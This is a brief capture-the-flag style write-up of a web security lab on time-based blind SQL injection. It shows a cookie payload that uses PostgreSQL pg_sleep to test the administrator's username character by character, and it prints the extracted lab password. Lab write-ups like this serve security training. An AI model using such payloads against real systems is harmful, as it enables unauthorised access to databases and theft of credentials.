# Lab: Blind SQL injection with time delays and information retrieval

URL: https://0a9c006003fccb9f8160344a00ed00e4.web-security-academy.net/

![](./Images/img1.png)

# Preparation:

Payload:

```
Cookie: TrackingId='||+(SELECT+CASE+WHEN+(username+like('a%25'))+THEN+pg_sleep(10)ELSE+pg_SLEEP(0)+END+from+users+where+username='administrator')+--+-
```

![](./Images/img2.png)

# Getting the User:

We will use the script from Time Based1.

![](./Images/img3.png)

# Getting the Password:

Password:

```
679441m9gg6gd985fztl
```

![](./Images/img4.png)

<br>

![](./Images/img5.png)